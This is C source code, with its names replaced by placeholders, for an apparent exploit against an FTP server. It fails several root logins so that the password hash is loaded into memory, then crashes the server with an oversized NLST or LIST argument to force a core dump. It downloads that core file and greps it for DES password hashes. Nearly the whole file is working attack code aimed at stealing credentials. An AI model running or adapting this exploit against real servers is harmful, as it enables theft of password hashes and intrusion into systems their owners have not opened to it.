
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int yo ;
struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
typedef int cli ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int FUNC_0 (int,struct sockaddr*,int*) ;
 int FUNC_1 (char*) ;
 scalar_t__ FUNC_2 (int,struct sockaddr*,int) ;
 int FUNC_3 (struct sockaddr_in*,int) ;
 int FUNC_4 (int) ;
 int FUNC_5 (char*,char*) ;
 int FUNC_6 (int) ;
 int FUNC_7 (int ,char*,...) ;
 int FUNC_8 (int) ;
 int FUNC_9 (int,char**,char*) ;
 int FUNC_10 () ;
 int FUNC_11 (int ) ;
 int FUNC_12 (int) ;
 char* VAR_6 ;
 scalar_t__ FUNC_13 (int,int) ;
 scalar_t__ FUNC_14 (int) ;
 int FUNC_15 (char*,char,int) ;
 int FUNC_16 (char*,int) ;
 int VAR_7 ;
 int FUNC_17 (char*) ;
 int FUNC_18 (char*) ;
 int FUNC_19 (int,int ) ;
 int FUNC_20 (int,char*,int,int ) ;
 int FUNC_21 (int) ;
 int FUNC_22 (int ,int,char*,...) ;
 int FUNC_23 (int ,int ,int ) ;
 int VAR_8 ;
 int FUNC_24 (char*,char*) ;
 int FUNC_25 (char*) ;
 int * FUNC_26 (char*,char*) ;
 scalar_t__ FUNC_27 (char*,char*) ;
 int FUNC_28 (char*) ;
 int FUNC_29 (char*) ;
 int FUNC_30 (int,char*,int) ;

int FUNC_31(int VAR_9, char *VAR_10[])
{
 extern int VAR_11;
 extern char *VAR_12;
 int VAR_13=0,VAR_14=0;
 int VAR_15,VAR_16,VAR_17;
 int VAR_18,VAR_19,VAR_20;
 int VAR_21;

 char *VAR_22 = ((void*)0);
 char *VAR_23 = "ftp";
 char *VAR_24 = "guest";
 char *VAR_25 = "pub";
 char *VAR_26 = "root";
 char *VAR_27 = "21";
 int VAR_28 = 0;
 char *VAR_29 = ((void*)0);
 char *VAR_30 = ((void*)0);
 int VAR_31[4], VAR_32;
 struct sockaddr_in VAR_33, VAR_34;
 char *VAR_35 = ((void*)0);

 while ((VAR_18 = FUNC_9(VAR_9, VAR_10, "h:i:p:l:k:d:c:s")) != VAR_1) {
  switch(VAR_18) {
  case 'h':
    VAR_22 = (char*)FUNC_14(FUNC_25(VAR_12)+1);
    FUNC_24(VAR_22, VAR_12);
  break;
  case 'i':
    VAR_29 = (char*)FUNC_14(FUNC_25(VAR_12)+1);
    FUNC_24(VAR_29, VAR_12);
  break;
  case 'p':
    VAR_27 = (char*)FUNC_14(FUNC_25(VAR_12)+1);
    FUNC_24(VAR_27, VAR_12);
  break;
  case 'l':
    VAR_23 = (char*)FUNC_14(FUNC_25(VAR_12)+1);
    FUNC_24(VAR_23, VAR_12);
    VAR_13 = 1;
  break;
  case 'k':
    VAR_24 = (char*)FUNC_14(FUNC_25(VAR_12)+1);
    FUNC_24(VAR_24, VAR_12);
    VAR_14 = 1;
  break;
  case 'd':
    VAR_25 = (char*)FUNC_14(FUNC_25(VAR_12)+1);
    FUNC_24(VAR_25, VAR_12);
  break;
  case 'c':
    VAR_26 = (char*)FUNC_14(FUNC_25(VAR_12)+1);
    FUNC_24(VAR_26, VAR_12);
  break;
  case 's':
    VAR_28 = 1;
  break;
  default:
    FUNC_29(VAR_10[0]);
  }
 }

 if (VAR_22 == ((void*)0) || VAR_29 == ((void*)0))
  FUNC_29(VAR_10[0]);

 if ((VAR_13 && !VAR_14) || (!VAR_13 && VAR_14)) {
  FUNC_29(VAR_10[0]);
 }

 VAR_15 = FUNC_5(VAR_22, VAR_27);
 FUNC_8(VAR_15);

 FUNC_7(VAR_8, "populating DES hash in memory...\n");

 for (VAR_19=0;VAR_19<3;VAR_19++) {
  FUNC_22(VAR_7, sizeof VAR_7, "USER %s\r\n", VAR_26);
  FUNC_19(VAR_15, VAR_7);
  FUNC_8(VAR_15);
  FUNC_22(VAR_7, sizeof VAR_7, "PASS abcdef\r\n");
  FUNC_19(VAR_15,VAR_7);
  FUNC_8(VAR_15);
 }

 FUNC_7(VAR_8, "logging in...\n");

 FUNC_22(VAR_7, sizeof VAR_7, "USER %s\r\n", VAR_23);
 FUNC_19(VAR_15, VAR_7);
 FUNC_8(VAR_15);
 FUNC_22(VAR_7, sizeof VAR_7, "PASS %s\r\n", VAR_24);
 FUNC_19(VAR_15,VAR_7);
 FUNC_8(VAR_15);
 FUNC_8(VAR_15);

 FUNC_7(VAR_8, "changing directory...\n");

 FUNC_22(VAR_7, sizeof VAR_7, "CWD %s\r\n", VAR_25);
 FUNC_19(VAR_15, VAR_7);
 FUNC_8(VAR_15);

 FUNC_7(VAR_8, "triggering segmentation violation...\n");

 VAR_30 = (char*)FUNC_14(2000);
 FUNC_15(VAR_30, 'A', 2000);
 VAR_30[2000-1]=0;

 if (!VAR_28) {
  FUNC_22(VAR_7, sizeof VAR_7, "NLST ~%s\r\n", VAR_30);
 } else {

  FUNC_22(VAR_7, sizeof VAR_7, "LIST ~%s\r\n", VAR_30);
 }
 FUNC_19(VAR_15, VAR_7);

 FUNC_15(VAR_6, '\0', sizeof VAR_6);
 if (FUNC_20(VAR_15, VAR_6, sizeof VAR_6, 0) < 1) {
  FUNC_18("trigger succeeded!\nwaiting for core file to be created...\n");
 } else {
  FUNC_18("trigger seems to have failed, proceeding anyways...\n"
  "\nwaiting for core file to be created...\n");
 }

 FUNC_21(5);

 FUNC_4(VAR_15);

 VAR_15 = FUNC_5(VAR_22, VAR_27);
 FUNC_8(VAR_15);

 FUNC_7(VAR_8, "logging in 2nd time...\n");

 FUNC_22(VAR_7, sizeof VAR_7, "USER %s\r\n", VAR_23);
 FUNC_19(VAR_15, VAR_7);
 FUNC_8(VAR_15);
 FUNC_22(VAR_7, sizeof VAR_7, "PASS %s\r\n", VAR_24);
 FUNC_19(VAR_15,VAR_7);
 FUNC_8(VAR_15);
 FUNC_8(VAR_15);

 FUNC_7(VAR_8, "changing directory...\n");

 FUNC_22(VAR_7, sizeof VAR_7, "CWD %s\r\n", VAR_25);
 FUNC_19(VAR_15, VAR_7);
 FUNC_8(VAR_15);

 FUNC_7(VAR_8, "getting core file...\n");

 FUNC_22(VAR_7, sizeof VAR_7, "TYPE I\r\n");
 FUNC_19(VAR_15, VAR_7);
 FUNC_8(VAR_15);

 VAR_32 = FUNC_10() + 1024;
 VAR_20 = sizeof(VAR_34);

 FUNC_3(&VAR_33, sizeof(VAR_33));
 VAR_33.sin_family = VAR_0;
 VAR_33.sin_port=FUNC_12(VAR_32);
 VAR_33.sin_addr.s_addr = FUNC_11(VAR_2);

 VAR_35=(char *)FUNC_27(VAR_29,".");
 VAR_31[0]=FUNC_1(VAR_35);
 VAR_35=(char *)FUNC_27(((void*)0),".");
 VAR_31[1]=FUNC_1(VAR_35);
 VAR_35=(char *)FUNC_27(((void*)0),".");
 VAR_31[2]=FUNC_1(VAR_35);
 VAR_35=(char *)FUNC_27(((void*)0),".");
 VAR_31[3]=FUNC_1(VAR_35);

 FUNC_22(VAR_7, sizeof VAR_7, "PORT %d,%d,%d,%d,%d,%d\r\n", VAR_31[0], VAR_31[1], VAR_31[2], VAR_31[3], VAR_32 / 256, VAR_32 % 256);
 FUNC_19(VAR_15, VAR_7);
 FUNC_8(VAR_15);

 if ((VAR_16=FUNC_23(VAR_0, VAR_5, 0)) < 0) {
  FUNC_17("socket");
  return -1;
 }

 if ((FUNC_2(VAR_16, (struct sockaddr *) &VAR_33, sizeof(VAR_33))) < 0) {
  FUNC_17("bind");
  FUNC_4(VAR_16);
  FUNC_6(1);
 }

 if (FUNC_13(VAR_16, 10) < 0) {
  FUNC_17("listen");
  FUNC_4(VAR_16);
  FUNC_6(1);
 }

 FUNC_22(VAR_7, sizeof VAR_7, "RETR core\r\n");
 FUNC_19(VAR_15, VAR_7);
 FUNC_8(VAR_15);
 if (FUNC_26(VAR_6, "150") == ((void*)0)) {
  FUNC_7(VAR_8, "core file not found... terminating.\n");
  FUNC_4(VAR_15);
  FUNC_6(1);
 }

 VAR_21 = FUNC_16("core", VAR_4 | VAR_3);
 if (VAR_21 == -1) {
  FUNC_17("open on local core file");
  FUNC_4(VAR_15);
  FUNC_6(1);
 }

 FUNC_21(1);

 if ((VAR_17 = FUNC_0(VAR_16, (struct sockaddr *)&VAR_34, &VAR_20)) < 0) {
  FUNC_17("accept");
  FUNC_4(VAR_15);
  FUNC_6(1);
 }

 do {
  VAR_19 = FUNC_20(VAR_17, VAR_6, sizeof VAR_6, 0);
  if (VAR_19 < 1) break;
  FUNC_30(VAR_21, VAR_6, VAR_19);
 } while (VAR_19 > 0);

 FUNC_4(VAR_17);
 FUNC_4(VAR_21);
 FUNC_4(VAR_15);

 FUNC_7(VAR_8, "finally extracting DES hashes from core file for user '%s'...\n", VAR_26);
 FUNC_28("strings core | grep '^[A-Za-z0-9]\\{13\\}$'");

 FUNC_7(VAR_8, "done.\n");
 return 0;
}
